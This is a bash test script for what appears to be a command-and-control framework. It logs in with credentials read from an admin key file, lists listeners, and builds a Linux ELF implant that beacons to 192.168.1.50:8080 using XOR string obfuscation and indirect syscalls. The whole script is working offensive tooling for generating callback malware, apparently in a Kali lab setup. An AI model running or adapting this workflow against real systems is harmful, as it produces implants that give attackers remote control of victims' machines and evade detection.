#!/usr/bin/env bash
# Build a Linux ELF implant through the API and report the result.
#
# This is the end-to-end test: the implant is configured to call back to
# Kali's bridged address (192.168.1.50:8080), so running it on Kali itself
# proves the whole chain works without needing the target VM.

set -uo pipefail

ROOT=/home/myroot/umbra
BASE=http://127.0.0.1:9000
KALI_IP=192.168.1.50
LISTENER_PORT=8080

echo "=== 1. login ==="
KEY=$(head -1 "$ROOT/admin.key")
U="${KEY%%:*}"
R="${KEY#*:}"
P="${R%%:*}"
S="${R#*:}"

TOKEN=$(curl -s -X POST "$BASE/auth/login" \
  -H 'Content-Type: application/json' \
  -d "{\"user\":\"$U\",\"pass\":\"$P\",\"secret\":\"$S\"}" 2>/dev/null \
  | python3 -c 'import json,sys; print(json.load(sys.stdin).get("access_token") or "")' 2>/dev/null)

if [[ -z "$TOKEN" ]]; then
  echo "  login failed"
  exit 1
fi
echo "  token ok"

echo
echo "=== 2. listener state ==="
curl -s "$BASE/api/listeners/" -H "Authorization: Bearer $TOKEN" 2>/dev/null > /tmp/l.json
python3 - <<'PY'
import json
d = json.load(open('/tmp/l.json'))
for ch in (d.get('active_channels') or []):
    print('  name={} host={} port={}'.format(ch.get('name'), ch.get('host'), ch.get('port')))
PY

echo
echo "=== 3. build a linux/elf implant ==="
cat > /tmp/build-body.json <<JSON
{
  "type": "build",
  "implant_base": "stageless",
  "config": {
    "operational_system": "linux",
    "cpu": "amd",
    "arch": "x64",
    "format": "elf",
    "protocol": "http",
    "servers": {"1": "${KALI_IP}:${LISTENER_PORT}"},
    "sleep": "5",
    "delay": "20",
    "sleep_mask": "off",
    "string_obfuscation": "xor",
    "etw_patch": "off",
    "amsi_patch": "off",
    "pe_headers_patch": "off",
    "show_conhost": "off",
    "api_resolution": "dynamic",
    "syscall_method": "indirect"
  }
}
JSON

echo "  request:"
python3 -c 'import json; d=json.load(open("/tmp/build-body.json")); print("   ", json.dumps(d["config"], ensure_ascii=False))'

RESP=$(curl -s -X POST "$BASE/api/implants/" \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  --data-binary @/tmp/build-body.json 2>/dev/null)

echo
echo "=== 4. build response ==="
echo "$RESP" | head -c 600
echo

echo
echo "=== 5. parse response ==="
echo "$RESP" > /tmp/build-resp.json
python3 - <<'PY'
import json

try:
    d = json.load(open('/tmp/build-resp.json'))
except Exception as e:
    print('  cannot parse response:', e)
    raise SystemExit(0)

print('  status:', d.get('status'))
print('  message:', str(d.get('message'))[:200])
for k, v in d.items():
    if k in ('status', 'message'):
        continue
    s = str(v)
    print('  {}: {}'.format(k, s[:120] + ('...' if len(s) > 120 else '')))
PY
